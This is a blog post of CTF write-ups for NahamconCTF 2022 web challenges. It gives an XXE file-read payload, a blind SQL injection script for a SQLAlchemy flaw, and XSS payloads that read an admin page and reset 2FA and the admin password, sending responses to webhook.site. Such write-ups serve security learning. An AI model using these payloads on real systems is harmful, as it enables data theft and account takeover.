<!DOCTYPE html><html lang="en" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="generator" content="Jekyll v4.2.2" /><meta property="og:title" content="NahamconCTF 2022" /><meta name="author" content="to^" /><meta property="og:locale" content="en" /><meta name="description" content="From Nahamconctf2022" /><meta property="og:description" content="From Nahamconctf2022" /><link rel="canonical" href="https://to016.github.io//posts/nahamconctf2022/" /><meta property="og:url" content="https://to016.github.io//posts/nahamconctf2022/" /><meta property="og:site_name" content="to^" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2022-05-01T01:10:00+07:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="NahamconCTF 2022" /><meta name="twitter:site" content="@nguyendt0" /><meta name="twitter:creator" content="@to^" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"to^"},"dateModified":"2022-05-05T07:41:07+07:00","datePublished":"2022-05-01T01:10:00+07:00","description":"From Nahamconctf2022","headline":"NahamconCTF 2022","mainEntityOfPage":{"@type":"WebPage","@id":"https://to016.github.io//posts/nahamconctf2022/"},"url":"https://to016.github.io//posts/nahamconctf2022/"}</script><title>NahamconCTF 2022 | to^</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="to^"><meta name="application-name" content="to^"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="dns-prefetch" href="https://fonts.gstatic.com" crossorigin><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://cdn.jsdelivr.net" ><link rel="dns-prefetch" href="https://cdn.jsdelivr.net" ><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato&family=Source+Sans+Pro:wght@400;600;700;900&display=swap"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script> <script type="text/javascript"> class ModeToggle { static get MODE_KEY() { return "mode"; } static get MODE_ATTR() { return "data-mode"; } static get DARK_MODE() { return "dark"; } static get LIGHT_MODE() { return "light"; } static get ID() { return "mode-toggle"; } constructor() { if (this.hasMode) { if (this.isDarkMode) { if (!this.isSysDarkPrefer) { this.setDark(); } } else { if (this.isSysDarkPrefer) { this.setLight(); } } } let self = this; /* always follow the system prefers */ this.sysDarkPrefers.addEventListener("change", () => { if (self.hasMode) { if (self.isDarkMode) { if (!self.isSysDarkPrefer) { self.setDark(); } } else { if (self.isSysDarkPrefer) { self.setLight(); } } self.clearMode(); } self.notify(); }); } /* constructor() */ get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); } get isSysDarkPrefer() { return this.sysDarkPrefers.matches; } get isDarkMode() { return this.mode === ModeToggle.DARK_MODE; } get isLightMode() { return this.mode === ModeToggle.LIGHT_MODE; } get hasMode() { return this.mode != null; } get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); } /* get the current mode on screen */ get modeStatus() { if (this.isDarkMode || (!this.hasMode && this.isSysDarkPrefer)) { return ModeToggle.DARK_MODE; } else { return ModeToggle.LIGHT_MODE; } } setDark() { $('html').attr(ModeToggle.MODE_ATTR, ModeToggle.DARK_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); } setLight() { $('html').attr(ModeToggle.MODE_ATTR, ModeToggle.LIGHT_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); } clearMode() { $('html').removeAttr(ModeToggle.MODE_ATTR); sessionStorage.removeItem(ModeToggle.MODE_KEY); } /* Notify another plugins that the theme mode has changed */ notify() { window.postMessage({ direction: ModeToggle.ID, message: this.modeStatus }, "*"); } } /* ModeToggle */ const toggle = new ModeToggle(); function flipMode() { if (toggle.hasMode) { if (toggle.isSysDarkPrefer) { if (toggle.isLightMode) { toggle.clearMode(); } else { toggle.setLight(); } } else { if (toggle.isDarkMode) { toggle.clearMode(); } else { toggle.setDark(); } } } else { if (toggle.isSysDarkPrefer) { toggle.setLight(); } else { toggle.setDark(); } } toggle.notify(); } /* flipMode() */ </script><body data-spy="scroll" data-target="#toc" data-topbar-visible="true"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src=" /assets/img/avatar.jpeg " alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">to^</a></div><div class="site-subtitle font-italic">Student, CTFer, web warrior</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center"> <button class="mode-toggle btn" aria-label="Switch Mode"> <i class="fas fa-adjust"></i> </button> <span class="icon-border"></span> <a href="https://github.com/to016" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github"></i> </a> <a href="https://twitter.com/nguyendt0" aria-label="twitter" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['todinhnguyen1610','gmail.com'].join('@')" aria-label="email" > <i class="fas fa-envelope"></i> </a> <a href="/feed.xml" aria-label="rss" > <i class="fas fa-rss"></i> </a></div></div><div id="topbar-wrapper" class="row justify-content-center"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>NahamconCTF 2022</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="core-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>NahamconCTF 2022</h1><div class="post-meta text-muted"><div> By <em> <a href="https://twitter.com/nguyendt0">Tô Đỉnh Nguyên</a> </em></div><div class="d-flex"><div> <span> Posted <em class="timeago" data-ts="1651342200" data-toggle="tooltip" data-placement="bottom" data-tooltip-df="llll" > 2022-05-01 </em> </span> <span> Updated <em class="timeago" data-ts="1651711267" data-toggle="tooltip" data-placement="bottom" data-tooltip-df="llll" > 2022-05-05 </em> </span> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="487 words"> <em>2 min</em> read</span></div></div></div><div class="post-content"><p>Solution for some web challenges</p><p><img data-src="/assets/img/nahamconctf2022/solves.png" alt="solvedChallenge" data-proofer-ignore> <em>solved challenges</em></p><h2 id="extravagant"><span class="mr-2">EXtravagant</span><a href="#extravagant" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p>Upload exp.xml and view it</p><div class="language-xml highlighter-rouge"><div class="code-header"> <span data-label-text="XML"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre><span class="cp">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span>
<span class="cp">&lt;!DOCTYPE foo [ &lt;!ENTITY xxe SYSTEM "/var/www/flag.txt"&gt;</span> ]&gt;
<span class="nt">&lt;foo&gt;</span><span class="ni">&amp;xxe;</span><span class="nt">&lt;/foo&gt;</span>
</pre></table></code></div></div><blockquote class="prompt-info"><div><p>flag{639b72f2dd0017f454c44c3863c4e195}</p></div></blockquote><hr /><h2 id="jurassic-park"><span class="mr-2">Jurassic Park</span><a href="#jurassic-park" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p>access <code class="language-plaintext highlighter-rouge">robots.txt</code> <img data-src="/assets/img/nahamconctf2022/JurassicPark/flag.png" alt="Jurassic Park" data-proofer-ignore></p><hr /><h2 id="personnel"><span class="mr-2">Personnel</span><a href="#personnel" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p>exploit script:</p><div class="language-py highlighter-rouge"><div class="code-header"> <span data-label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre><td class="rouge-code"><pre><span class="kn">import</span> <span class="nn">requests</span>
<span class="kn">import</span> <span class="nn">re</span>

<span class="n">TARGET</span> <span class="o">=</span> <span class="s">"http://challenge.nahamcon.com:30349/"</span>

<span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">post</span><span class="p">(</span><span class="n">TARGET</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="p">{</span><span class="s">"name"</span><span class="p">:</span> <span class="s">"1|(flag.*)|1"</span><span class="p">,</span> <span class="s">"setting"</span><span class="p">:</span><span class="mi">0</span><span class="p">})</span>

<span class="n">flag</span> <span class="o">=</span> <span class="n">re</span><span class="p">.</span><span class="n">search</span><span class="p">(</span><span class="sa">r</span><span class="s">"&lt;li&gt;(flag.*)&lt;/li&gt;"</span><span class="p">,</span> <span class="n">r</span><span class="p">.</span><span class="n">text</span><span class="p">).</span><span class="n">group</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
<span class="k">print</span><span class="p">(</span><span class="s">"[-] FLAG: "</span> <span class="o">+</span> <span class="n">flag</span><span class="p">)</span>
</pre></table></code></div></div><blockquote class="prompt-info"><div><p>flag{f0e659b45b507d8633065bbd2832c627}</p></div></blockquote><hr /><h2 id="flaskmetal-alchemist"><span class="mr-2">Flaskmetal Alchemist</span><a href="#flaskmetal-alchemist" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p>From requirements.txt, server uses <code class="language-plaintext highlighter-rouge">SQLAlchemy==1.2.17</code> and it is vulnerable to <a href="https://www.cvedetails.com/cve/CVE-2019-7164/">sqli</a>.</p><p>exploit script:</p><div class="language-py highlighter-rouge"><div class="code-header"> <span data-label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
</pre><td class="rouge-code"><pre><span class="kn">import</span> <span class="nn">requests</span>
<span class="kn">import</span> <span class="nn">string</span>
<span class="n">TARGET</span> <span class="o">=</span> <span class="s">"http://challenge.nahamcon.com:30378/"</span>
<span class="n">FLAG_LENGTH</span> <span class="o">=</span> <span class="mi">0</span>

<span class="c1"># Find flag length
</span><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">30</span><span class="p">):</span>
    <span class="n">order_by_inject</span> <span class="o">=</span> <span class="sa">f</span><span class="s">"(SELECT CASE WHEN ((SELECT LENGTH(flag) from flag) = </span><span class="si">{</span><span class="n">i</span><span class="o">+</span><span class="mi">1</span><span class="si">}</span><span class="s">) THEN atomic_number ELSE symbol END)"</span>
    <span class="n">data</span> <span class="o">=</span> <span class="p">{</span><span class="s">"search"</span> <span class="p">:</span> <span class="s">"a"</span><span class="p">,</span> <span class="s">"order"</span><span class="p">:</span> <span class="n">order_by_inject</span><span class="p">}</span>
    <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">post</span><span class="p">(</span><span class="n">TARGET</span><span class="p">,</span> <span class="n">data</span><span class="p">)</span>

    <span class="c1"># with this payload, "aotomic number" column will return "89" before "12" if the WHEN condition is true
</span>    <span class="k">if</span> <span class="n">r</span><span class="p">.</span><span class="n">text</span><span class="p">.</span><span class="n">find</span><span class="p">(</span><span class="s">"89&lt;/td&gt;"</span><span class="p">)</span> <span class="o">&gt;</span> <span class="n">r</span><span class="p">.</span><span class="n">text</span><span class="p">.</span><span class="n">find</span><span class="p">(</span><span class="s">"12&lt;/td&gt;"</span><span class="p">):</span>
        <span class="n">FLAG_LENGTH</span> <span class="o">=</span> <span class="n">i</span><span class="o">+</span><span class="mi">1</span>
        <span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"[-] Flag length: </span><span class="si">{</span><span class="n">FLAG_LENGTH</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
        <span class="k">break</span>


<span class="c1"># Find flag
</span><span class="n">FLAG</span> <span class="o">=</span> <span class="s">""</span>
<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">FLAG_LENGTH</span><span class="p">):</span>
    <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">string</span><span class="p">.</span><span class="n">ascii_lowercase</span> <span class="o">+</span> <span class="s">"_}{"</span><span class="p">:</span>
        <span class="n">order_by_inject</span> <span class="o">=</span> <span class="sa">f</span><span class="s">"(SELECT CASE WHEN ((SELECT SUBSTR(flag, </span><span class="si">{</span><span class="n">i</span><span class="o">+</span><span class="mi">1</span><span class="si">}</span><span class="s">, 1) from flag) = '</span><span class="si">{</span><span class="n">c</span><span class="si">}</span><span class="s">') THEN atomic_number ELSE symbol END)"</span>
        <span class="n">data</span> <span class="o">=</span> <span class="p">{</span><span class="s">"search"</span> <span class="p">:</span> <span class="s">"a"</span><span class="p">,</span> <span class="s">"order"</span><span class="p">:</span> <span class="n">order_by_inject</span><span class="p">}</span>
        <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">post</span><span class="p">(</span><span class="n">TARGET</span><span class="p">,</span> <span class="n">data</span><span class="p">)</span>
    
        <span class="k">if</span> <span class="n">r</span><span class="p">.</span><span class="n">text</span><span class="p">.</span><span class="n">find</span><span class="p">(</span><span class="s">"89&lt;/td&gt;"</span><span class="p">)</span> <span class="o">&gt;</span> <span class="n">r</span><span class="p">.</span><span class="n">text</span><span class="p">.</span><span class="n">find</span><span class="p">(</span><span class="s">"12&lt;/td&gt;"</span><span class="p">):</span>
            <span class="n">FLAG</span> <span class="o">+=</span> <span class="n">c</span>
            <span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"[-] Flag: </span><span class="si">{</span><span class="n">FLAG</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
            <span class="k">break</span>
</pre></table></code></div></div><blockquote class="prompt-info"><div><p>flag{order_by_blind}</p></div></blockquote><h2 id="hacker-ts"><span class="mr-2">Hacker Ts</span><a href="#hacker-ts" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p>The page renders text on t-shirts based on POST <code class="language-plaintext highlighter-rouge">text</code> param.</p><div class="language-js highlighter-rouge"><div class="code-header"> <span data-label-text="JavaScript"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre><td class="rouge-code"><pre><span class="nx">x</span><span class="o">=</span><span class="k">new</span> <span class="nx">XMLHttpRequest</span><span class="p">;</span>
<span class="nx">x</span><span class="p">.</span><span class="nx">onload</span><span class="o">=</span><span class="kd">function</span><span class="p">(){</span>
<span class="nx">x1</span><span class="o">=</span><span class="k">new</span> <span class="nx">XMLHttpRequest</span><span class="p">;</span>
<span class="nx">x1</span><span class="p">.</span><span class="nx">open</span><span class="p">(</span><span class="dl">"</span><span class="s2">GET</span><span class="dl">"</span><span class="p">,</span><span class="dl">"</span><span class="s2">https://webhook.site/f61d8f20-bc48-4ae9-805f-3db7a842363b?c=</span><span class="dl">"</span><span class="o">%</span><span class="mi">2</span><span class="nx">bencodeURIComponent</span><span class="p">(</span><span class="nx">btoa</span><span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="nx">responseText</span><span class="p">)));</span>
<span class="nx">x1</span><span class="p">.</span><span class="nx">send</span><span class="p">();</span>
<span class="p">};</span>
<span class="nx">x</span><span class="p">.</span><span class="nx">open</span><span class="p">(</span><span class="dl">"</span><span class="s2">GET</span><span class="dl">"</span><span class="p">,</span><span class="dl">"</span><span class="s2">http://localhost:5000/admin</span><span class="dl">"</span><span class="p">);</span>
<span class="nx">x</span><span class="p">.</span><span class="nx">send</span><span class="p">();</span>
</pre></table></code></div></div><p>webhook receives request: <img data-src="/assets/img/nahamconctf2022/HackerTs/result.png" alt="result" data-proofer-ignore> <em>result</em></p><p><img data-src="/assets/img/nahamconctf2022/HackerTs/flag.png" alt="flag" data-proofer-ignore> <em>flag</em></p><hr /><h2 id="two-for-one"><span class="mr-2">Two For One</span><a href="#two-for-one" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p>This is a two factor authentication challenge using password and OTP.</p><p>The feedback features in <code class="language-plaintext highlighter-rouge">Settings</code> page is vulnerable to blind XSS</p><p>Solve steps: reset 2FA -&gt; reset admin account’s password -&gt; login as admin -&gt; get flag</p><h3 id="get-new-otp-auth-value"><span class="mr-2">Get new otp auth value</span><a href="#get-new-otp-auth-value" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><div class="language-js highlighter-rouge"><div class="code-header"> <span data-label-text="JavaScript"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre><td class="rouge-code"><pre>    <span class="kd">var</span> <span class="nx">x</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">XMLHttpRequest</span><span class="p">();</span>
    <span class="nx">x</span><span class="p">.</span><span class="nx">open</span><span class="p">(</span><span class="dl">'</span><span class="s1">POST</span><span class="dl">'</span><span class="p">,</span> <span class="dl">'</span><span class="s1">http://challenge.nahamcon.com:32084/reset2fa</span><span class="dl">'</span><span class="p">);</span>
    <span class="nx">x</span><span class="p">.</span><span class="nx">setRequestHeader</span><span class="p">(</span><span class="dl">"</span><span class="s2">Content-Type</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">application/json</span><span class="dl">"</span><span class="p">);</span>
    <span class="nx">x</span><span class="p">.</span><span class="nx">setRequestHeader</span><span class="p">(</span><span class="dl">"</span><span class="s2">Accept</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">application/json</span><span class="dl">"</span><span class="p">);</span>
    <span class="nx">x</span><span class="p">.</span><span class="nx">onload</span> <span class="o">=</span> <span class="kd">function</span><span class="p">()</span> <span class="p">{</span>
        <span class="nb">navigator</span><span class="p">.</span><span class="nx">sendBeacon</span><span class="p">(</span><span class="dl">'</span><span class="s1">https://webhook.site/8771a7aa-4464-438a-84ac-7311eae5bd87</span><span class="dl">'</span><span class="p">,</span> <span class="k">this</span><span class="p">.</span><span class="nx">responseText</span><span class="p">);</span>
    <span class="p">};</span>
    <span class="nx">x</span><span class="p">.</span><span class="nx">send</span><span class="p">();</span>
</pre></table></code></div></div><p><img data-src="/assets/img/nahamconctf2022/TwoforOne/leakotpauth.png" alt="new otp auth value" data-proofer-ignore> <em>otp auth</em></p><h3 id="generate-new-admins-qr-code"><span class="mr-2">Generate new admin’s qr code</span><a href="#generate-new-admins-qr-code" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><div class="language-html highlighter-rouge"><div class="code-header"> <span data-label-text="HTML"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
</pre><td class="rouge-code"><pre><span class="cp">&lt;!DOCTYPE html&gt;</span>
<span class="nt">&lt;html</span> <span class="na">lang=</span><span class="s">"en"</span><span class="nt">&gt;</span>

<span class="nt">&lt;head&gt;</span>
    <span class="nt">&lt;meta</span> <span class="na">charset=</span><span class="s">"UTF-8"</span><span class="nt">&gt;</span>
    <span class="nt">&lt;meta</span> <span class="na">http-equiv=</span><span class="s">"X-UA-Compatible"</span> <span class="na">content=</span><span class="s">"IE=edge"</span><span class="nt">&gt;</span>
    <span class="nt">&lt;meta</span> <span class="na">name=</span><span class="s">"viewport"</span> <span class="na">content=</span><span class="s">"width=device-width, initial-scale=1.0"</span><span class="nt">&gt;</span>
    <span class="nt">&lt;title&gt;</span>QR code page<span class="nt">&lt;/title&gt;</span>
<span class="nt">&lt;/head&gt;</span>

<span class="nt">&lt;body&gt;</span>
    <span class="nt">&lt;script </span><span class="na">src=</span><span class="s">"https://cdnjs.cloudflare.com/ajax/libs/qrious/4.0.2/qrious.min.js"</span><span class="nt">&gt;&lt;/script&gt;</span>
    <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"row"</span><span class="nt">&gt;</span>
        <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"col-12"</span><span class="nt">&gt;</span>
            <span class="nt">&lt;canvas</span> <span class="na">id=</span><span class="s">"qr"</span> <span class="na">style=</span><span class="s">"margin-right: auto; margin-left: auto;"</span><span class="nt">&gt;&lt;/canvas&gt;</span>
        <span class="nt">&lt;/div&gt;</span>
    <span class="nt">&lt;/div&gt;</span>
    <span class="nt">&lt;script&gt;</span>
        <span class="kd">var</span> <span class="nx">qr</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">QRious</span><span class="p">({</span>
            <span class="na">size</span><span class="p">:</span> <span class="mi">250</span><span class="p">,</span>
            <span class="na">element</span><span class="p">:</span> <span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="dl">'</span><span class="s1">qr</span><span class="dl">'</span><span class="p">),</span>
            <span class="na">value</span><span class="p">:</span> <span class="dl">"</span><span class="s2">otpauth://totp/Fort%20Knox:admin?secret=QFBPNXXUIQ6D3LAD&amp;issuer=Fort%20Knox</span><span class="dl">"</span>
        <span class="p">});</span>
    <span class="nt">&lt;/script&gt;</span>
<span class="nt">&lt;/body&gt;</span>
<span class="nt">&lt;/html&gt;</span>
</pre></table></code></div></div><p><img data-src="/assets/img/nahamconctf2022/TwoforOne/generate_admin_qr_code.png" alt="admin qr code" data-proofer-ignore> <em>new admin qr code</em></p><h3 id="reset-admin-password"><span class="mr-2">Reset admin password</span><a href="#reset-admin-password" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><div class="language-js highlighter-rouge"><div class="code-header"> <span data-label-text="JavaScript"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
</pre><td class="rouge-code"><pre>    <span class="kd">var</span> <span class="nx">x</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">XMLHttpRequest</span><span class="p">();</span>
    <span class="nx">x</span><span class="p">.</span><span class="nx">open</span><span class="p">(</span><span class="dl">'</span><span class="s1">POST</span><span class="dl">'</span><span class="p">,</span> <span class="dl">'</span><span class="s1">http://challenge.nahamcon.com:30223/reset_password</span><span class="dl">'</span><span class="p">);</span>
    <span class="nx">x</span><span class="p">.</span><span class="nx">setRequestHeader</span><span class="p">(</span><span class="dl">"</span><span class="s2">Content-Type</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">application/json</span><span class="dl">"</span><span class="p">);</span>
    <span class="nx">x</span><span class="p">.</span><span class="nx">setRequestHeader</span><span class="p">(</span><span class="dl">"</span><span class="s2">Accept</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">application/json</span><span class="dl">"</span><span class="p">);</span>
    <span class="nx">x</span><span class="p">.</span><span class="nx">onload</span> <span class="o">=</span> <span class="kd">function</span><span class="p">()</span> <span class="p">{</span>
        <span class="nb">navigator</span><span class="p">.</span><span class="nx">sendBeacon</span><span class="p">(</span><span class="dl">'</span><span class="s1">https://webhook.site/8771a7aa-4464-438a-84ac-7311eae5bd87</span><span class="dl">'</span><span class="p">,</span> <span class="k">this</span><span class="p">.</span><span class="nx">responseText</span><span class="p">);</span>
    <span class="p">};</span>
    <span class="nx">x</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="nx">JSON</span><span class="p">.</span><span class="nx">stringify</span><span class="p">({</span>
        <span class="na">otp</span><span class="p">:</span> <span class="dl">"</span><span class="s2">063517</span><span class="dl">"</span><span class="p">,</span>
        <span class="na">password</span><span class="p">:</span> <span class="dl">"</span><span class="s2">to^</span><span class="dl">"</span><span class="p">,</span>
        <span class="na">password2</span><span class="p">:</span> <span class="dl">"</span><span class="s2">to^</span><span class="dl">"</span>
    <span class="p">}));</span>
</pre></table></code></div></div><h3 id="finally-login-and-view-flag"><span class="mr-2">Finally, login and view flag</span><a href="#finally-login-and-view-flag" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><p><img data-src="/assets/img/nahamconctf2022/TwoforOne/flag.png" alt="flag" data-proofer-ignore> <em>flag</em></p></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/websec/'>WebSec</a>, <a href='/categories/ctf/'>CTF</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/xss/" class="post-tag no-text-decoration" >xss</a> <a href="/tags/xxe/" class="post-tag no-text-decoration" >xxe</a> <a href="/tags/sqli/" class="post-tag no-text-decoration" >sqli</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=NahamconCTF 2022 - to^&amp;url=https://to016.github.io//posts/nahamconctf2022/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=NahamconCTF 2022 - to^&amp;u=https://to016.github.io//posts/nahamconctf2022/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://t.me/share/url?url=https://to016.github.io//posts/nahamconctf2022/&amp;text=NahamconCTF 2022 - to^" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i id="copy-link" class="fa-fw fas fa-link small" data-toggle="tooltip" data-placement="top" title="Copy link" data-title-succeed="Link copied successfully!"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted"><div class="access"><div id="access-lastmod" class="post"><div class="panel-heading">Recently Updated</div><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/PHPLFI2RCE/">Các kĩ thuật nâng cao trong khai thác lỗ hổng PHP LFI2RCE</a><li><a href="/posts/angstromctf2022/">AngstromCTF 2022</a><li><a href="/posts/SWandMITM/">Service worker và Man-in-the-Middle Attack</a><li><a href="/posts/noted/">Noted - picoCTF2022</a><li><a href="/posts/31linephp/">31 Line PHP - SPbCTF2021</a></ul></div><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/xss/">xss</a> <a class="post-tag" 